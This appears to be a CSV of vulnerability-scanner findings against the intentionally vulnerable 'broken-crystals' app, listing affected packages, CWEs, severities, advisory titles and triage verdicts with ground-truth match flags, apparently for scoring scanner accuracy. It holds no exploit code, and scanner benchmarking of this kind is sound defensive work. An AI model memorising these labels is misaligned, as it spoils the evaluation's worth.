finding_group_id,tools,target,cwe,severity,location,description,verdict,confidence,ground_truth_match,tool_count
GRP-broken-crystals--001,npm-audit,broken-crystals,,info,@angular-devkit/core,Dependency of: ajv,pending,low,no,1
GRP-broken-crystals--002,npm-audit,broken-crystals,,info,@angular-devkit/schematics,Dependency of: @angular-devkit/core,pending,low,no,1
GRP-broken-crystals--003,npm-audit,broken-crystals,,info,@angular-devkit/schematics-cli,"Dependency of: @angular-devkit/core, @angular-devkit/schematics, inquirer",pending,low,no,1
GRP-broken-crystals--004,npm-audit,broken-crystals,,info,@fastify/http-proxy,Dependency of: @fastify/reply-from,pending,low,no,1
GRP-broken-crystals--005,npm-audit,broken-crystals,,high,@mapbox/node-pre-gyp,Dependency of: tar,pending,low,no,1
GRP-broken-crystals--006,npm-audit,broken-crystals,,high,@nestjs/cli,"Dependency of: @angular-devkit/core, @angular-devkit/schematics, @angular-devkit/schematics-cli, @nestjs/schematics, glob, inquirer, webpack",pending,low,no,1
GRP-broken-crystals--007,npm-audit,broken-crystals,,info,@nestjs/config,Dependency of: lodash,pending,low,no,1
GRP-broken-crystals--008,npm-audit|nuclei,broken-crystals,,info,@nestjs/graphql,Dependency of: lodash,TP,high,no,2
GRP-broken-crystals--009,npm-audit,broken-crystals,,info,@nestjs/mercurius,"Dependency of: @nestjs/graphql, fastify",pending,low,no,1
GRP-broken-crystals--010,npm-audit,broken-crystals,,info,@nestjs/swagger,"Dependency of: js-yaml, lodash",pending,low,no,1
GRP-broken-crystals--011,npm-audit,broken-crystals,,low,@sectester/runner,Dependency of: fastify,pending,low,no,1
GRP-broken-crystals--012,npm-audit,broken-crystals,,low,external-editor,Dependency of: tmp,pending,low,no,1
GRP-broken-crystals--013,npm-audit,broken-crystals,,low,inquirer,Dependency of: external-editor,pending,low,no,1
GRP-broken-crystals--014,npm-audit,broken-crystals,,low,jwk-to-pem,Dependency of: elliptic,pending,low,no,1
GRP-broken-crystals--015,npm-audit,broken-crystals,,high,terser-webpack-plugin,Dependency of: serialize-javascript,pending,low,no,1
GRP-broken-crystals--016,trivy,broken-crystals,,low,curl@7.64.0-4+deb10u5,curl: cookie injection with none file,pending,low,no,1
GRP-broken-crystals--017,trivy,broken-crystals,,info,debian-archive-keyring@2019.1+deb10u1,debian-archive-keyring - security update,pending,low,no,1
GRP-broken-crystals--018,trivy,broken-crystals,,high,git@1:2.20.1-2+deb10u8,git: Remote code execution in recursive clones with nested submodules,pending,low,no,1
GRP-broken-crystals--019,trivy,broken-crystals,,high,git-man@1:2.20.1-2+deb10u8,git: Remote code execution in recursive clones with nested submodules,pending,low,no,1
GRP-broken-crystals--020,trivy,broken-crystals,,low,libcurl3-gnutls@7.64.0-4+deb10u5,curl: cookie injection with none file,pending,low,no,1
GRP-broken-crystals--021,trivy,broken-crystals,,low,libcurl4@7.64.0-4+deb10u5,curl: cookie injection with none file,pending,low,no,1
GRP-broken-crystals--022,trivy,broken-crystals,,low,libcurl4-openssl-dev@7.64.0-4+deb10u5,curl: cookie injection with none file,pending,low,no,1
GRP-broken-crystals--023,trivy,broken-crystals,,high,libheif1@1.3.2-2~deb10u1,"Floating point exception in function Fraction in libheif 1.4.0, allows ...",pending,low,no,1
GRP-broken-crystals--024,trivy,broken-crystals,,medium,libmariadb-dev@1:10.3.38-0+deb10u1,mysql: InnoDB unspecified vulnerability (CPU Oct 2023),pending,low,no,1
GRP-broken-crystals--025,trivy,broken-crystals,,medium,libmariadb-dev-compat@1:10.3.38-0+deb10u1,mysql: InnoDB unspecified vulnerability (CPU Oct 2023),pending,low,no,1
GRP-broken-crystals--026,trivy,broken-crystals,,medium,libmariadb3@1:10.3.38-0+deb10u1,mysql: InnoDB unspecified vulnerability (CPU Oct 2023),pending,low,no,1
GRP-broken-crystals--027,trivy,broken-crystals,,medium,libncurses-dev@6.1+20181013-2+deb10u3,ncurses: segmentation fault via _nc_wrap_entry(),pending,low,no,1
GRP-broken-crystals--028,trivy,broken-crystals,,medium,libncurses5-dev@6.1+20181013-2+deb10u3,ncurses: segmentation fault via _nc_wrap_entry(),pending,low,no,1
GRP-broken-crystals--029,trivy,broken-crystals,,medium,libncurses6@6.1+20181013-2+deb10u3,ncurses: segmentation fault via _nc_wrap_entry(),pending,low,no,1
GRP-broken-crystals--030,trivy,broken-crystals,,medium,libncursesw5-dev@6.1+20181013-2+deb10u3,ncurses: segmentation fault via _nc_wrap_entry(),pending,low,no,1
GRP-broken-crystals--031,trivy,broken-crystals,,medium,libncursesw6@6.1+20181013-2+deb10u3,ncurses: segmentation fault via _nc_wrap_entry(),pending,low,no,1
GRP-broken-crystals--032,trivy,broken-crystals,,medium,libpython2.7-minimal@2.7.16-2+deb10u1,python: TLS handshake bypass,pending,low,no,1
GRP-broken-crystals--033,trivy,broken-crystals,,medium,libpython2.7-stdlib@2.7.16-2+deb10u1,python: TLS handshake bypass,pending,low,no,1
GRP-broken-crystals--034,trivy,broken-crystals,,high,libpython3.7-minimal@3.7.3-2+deb10u4,python: Path traversal on tempfile.TemporaryDirectory,pending,low,no,1
GRP-broken-crystals--035,trivy,broken-crystals,,high,libpython3.7-stdlib@3.7.3-2+deb10u4,python: Path traversal on tempfile.TemporaryDirectory,pending,low,no,1
GRP-broken-crystals--036,trivy,broken-crystals,,high,libsqlite3-0@3.27.2-3+deb10u2,sqlite: mishandling of certain SELECT statements with non-existent VIEW can lead to DoS,pending,low,no,1
GRP-broken-crystals--037,trivy,broken-crystals,,high,libsqlite3-dev@3.27.2-3+deb10u2,sqlite: mishandling of certain SELECT statements with non-existent VIEW can lead to DoS,pending,low,no,1
GRP-broken-crystals--038,trivy,broken-crystals,,medium,libtinfo6@6.1+20181013-2+deb10u3,ncurses: segmentation fault via _nc_wrap_entry(),pending,low,no,1
GRP-broken-crystals--039,trivy,broken-crystals,,high,linux-libc-dev@4.19.269-1,kernel: f2fs: explicitly null-terminate the xattr list,pending,low,no,1
GRP-broken-crystals--040,trivy,broken-crystals,,medium,mariadb-common@1:10.3.38-0+deb10u1,mysql: InnoDB unspecified vulnerability (CPU Oct 2023),pending,low,no,1
GRP-broken-crystals--041,trivy,broken-crystals,,medium,ncurses-base@6.1+20181013-2+deb10u3,ncurses: segmentation fault via _nc_wrap_entry(),pending,low,no,1
GRP-broken-crystals--042,trivy,broken-crystals,,medium,ncurses-bin@6.1+20181013-2+deb10u3,ncurses: segmentation fault via _nc_wrap_entry(),pending,low,no,1
GRP-broken-crystals--043,trivy,broken-crystals,,high,openssh-client@1:7.9p1-10+deb10u2,openssh: privilege escalation when AuthorizedKeysCommand or AuthorizedPrincipalsCommand are configured,pending,low,no,1
GRP-broken-crystals--044,trivy,broken-crystals,,medium,python2.7@2.7.16-2+deb10u1,python: TLS handshake bypass,pending,low,no,1
GRP-broken-crystals--045,trivy,broken-crystals,,medium,python2.7-minimal@2.7.16-2+deb10u1,python: TLS handshake bypass,pending,low,no,1
GRP-broken-crystals--046,trivy,broken-crystals,,high,python3.7@3.7.3-2+deb10u4,python: Path traversal on tempfile.TemporaryDirectory,pending,low,no,1
GRP-broken-crystals--047,trivy,broken-crystals,,high,python3.7-minimal@3.7.3-2+deb10u4,python: Path traversal on tempfile.TemporaryDirectory,pending,low,no,1
GRP-broken-crystals--048,trivy,broken-crystals,,low,tar@1.30+dfsg-6,tar: Incorrectly handled extension attributes in PAX archives can lead to a crash,pending,low,no,1
GRP-broken-crystals--049,trivy,broken-crystals,,info,tzdata@2021a-0+deb10u10,tzdata - new timezone database,pending,low,no,1
GRP-broken-crystals--050,trivy,broken-crystals,,high,base64url@2.0.0,Out-of-bounds Read,pending,low,no,1
GRP-broken-crystals--051,trivy,broken-crystals,,critical,elliptic@6.5.4,Elliptic's private key extraction in ECDSA upon signing a malformed input (e.g. a string),pending,low,no,1
GRP-broken-crystals--052,trivy,broken-crystals,,medium,got@6.7.1,nodejs-got: missing verification of requested URLs allows redirects to UNIX sockets,pending,low,no,1
GRP-broken-crystals--053,zap,broken-crystals,,info,http://host.docker.internal:3001,Session Management Response Identified,pending,low,no,1
GRP-broken-crystals--054,nuclei,broken-crystals,,info,localhost:3001,Cookies without HttpOnly attribute - Detect,pending,low,no,1
GRP-broken-crystals--055,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--056,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--057,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--058,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--059,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--060,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--061,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--062,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--063,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--064,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals--065,nuclei,broken-crystals,,info,http://localhost:3001,HTTP Missing Security Headers,pending,low,no,1
GRP-broken-crystals-CWE-1004-066,zap,broken-crystals,CWE-1004,low,http://host.docker.internal:3001,Cookie No HttpOnly Flag,TP,medium,yes,1
GRP-broken-crystals-CWE-1004-067,bearer,broken-crystals,CWE-1004,info,src/main.ts:191,"## Description Your cookies are at risk if the HTTP Only option is not configured. This setting prevents client-side JavaScript, such as the code that reads ""document.cookie"" values, from accessing the cookie's value. Enabling this option is crucial for websites prone to Cross-Site Scripting (XSS) attacks, because it prevents malicious scripts from obtaining the cookie's data. ## Remediations - **Do** set the `HttpOnly` attribute to `true` in your cookie configuration. This action ensures that cookies are shielded from unauthorized client-side access. ```javascript cookie({ httpOnly: true }); ``` ## References - [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html#use-cookies-securely)",TP,medium,yes,1
GRP-broken-crystals-CWE-1050-068,trivy,broken-crystals,CWE-1050,high,braces@2.3.2,braces: fails to limit the number of characters it can handle,pending,low,no,1
GRP-broken-crystals-CWE-1050-069,trivy,broken-crystals,CWE-1050,high,braces@3.0.2,braces: fails to limit the number of characters it can handle,pending,low,no,1
GRP-broken-crystals-CWE-114-070,trivy,broken-crystals,CWE-114,high,git@1:2.20.1-2+deb10u8,git: RCE while cloning local repos,pending,low,no,1
GRP-broken-crystals-CWE-114-071,trivy,broken-crystals,CWE-114,high,git-man@1:2.20.1-2+deb10u8,git: RCE while cloning local repos,pending,low,no,1
GRP-broken-crystals-CWE-119-072,trivy,broken-crystals,CWE-119,low,libcroco3@0.6.12-3,libcroco: Memory allocation failure in the cr_tknzr_parse_comment function,pending,low,no,1
GRP-broken-crystals-CWE-119-073,trivy,broken-crystals,CWE-119,medium,libtiff-dev@4.1.0+git191117-2~deb10u7,libtiff: memory leak in tiffcrop.c,pending,low,no,1
GRP-broken-crystals-CWE-119-074,trivy,broken-crystals,CWE-119,medium,libtiff5@4.1.0+git191117-2~deb10u7,libtiff: memory leak in tiffcrop.c,pending,low,no,1
GRP-broken-crystals-CWE-119-075,trivy,broken-crystals,CWE-119,medium,libtiffxx5@4.1.0+git191117-2~deb10u7,libtiff: memory leak in tiffcrop.c,pending,low,no,1
GRP-broken-crystals-CWE-119-076,trivy,broken-crystals,CWE-119,high,libx11-6@2:1.6.7-1+deb10u2,libX11: InitExt.c can overwrite unintended portions of the Display structure if the extension request leads to a buffer overflow,pending,low,no,1
GRP-broken-crystals-CWE-119-077,trivy,broken-crystals,CWE-119,high,libx11-data@2:1.6.7-1+deb10u2,libX11: InitExt.c can overwrite unintended portions of the Display structure if the extension request leads to a buffer overflow,pending,low,no,1
GRP-broken-crystals-CWE-119-078,trivy,broken-crystals,CWE-119,high,libx11-dev@2:1.6.7-1+deb10u2,libX11: InitExt.c can overwrite unintended portions of the Display structure if the extension request leads to a buffer overflow,pending,low,no,1
GRP-broken-crystals-CWE-119-079,trivy,broken-crystals,CWE-119,medium,libxml2@2.9.4+dfsg1-7+deb10u5,libxml2: crafted xml can cause global buffer overflow,pending,low,no,1
GRP-broken-crystals-CWE-119-080,trivy,broken-crystals,CWE-119,medium,libxml2-dev@2.9.4+dfsg1-7+deb10u5,libxml2: crafted xml can cause global buffer overflow,pending,low,no,1
GRP-broken-crystals-CWE-119-081,trivy,broken-crystals,CWE-119,high,linux-libc-dev@4.19.269-1,kernel: nfp: use-after-free in area_cache_get(),pending,low,no,1
GRP-broken-crystals-CWE-120-082,trivy,broken-crystals,CWE-120,high,imagemagick@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-083,trivy,broken-crystals,CWE-120,high,imagemagick-6-common@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-084,trivy,broken-crystals,CWE-120,high,imagemagick-6.q16@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-085,trivy,broken-crystals,CWE-120,high,libde265-0@1.0.11-0+deb10u4,Libde265 v1.0.12 was discovered to contain multiple buffer overflows v ...,pending,low,no,1
GRP-broken-crystals-CWE-120-086,trivy,broken-crystals,CWE-120,high,libheif1@1.3.2-2~deb10u1,Buffer overflow vulnerability in function convert_colorspace in heif_c ...,pending,low,no,1
GRP-broken-crystals-CWE-120-087,trivy,broken-crystals,CWE-120,high,libmagickcore-6-arch-config@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-088,trivy,broken-crystals,CWE-120,high,libmagickcore-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-089,trivy,broken-crystals,CWE-120,high,libmagickcore-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-090,trivy,broken-crystals,CWE-120,high,libmagickcore-6.q16-6-extra@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-091,trivy,broken-crystals,CWE-120,high,libmagickcore-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-092,trivy,broken-crystals,CWE-120,high,libmagickcore-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-093,trivy,broken-crystals,CWE-120,high,libmagickwand-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-094,trivy,broken-crystals,CWE-120,high,libmagickwand-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
GRP-broken-crystals-CWE-120-095,trivy,broken-crystals,CWE-120,high,libmagickwand-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: heap-buffer-overflow in PushLongPixel() of quantum-private.h,pending,low,no,1
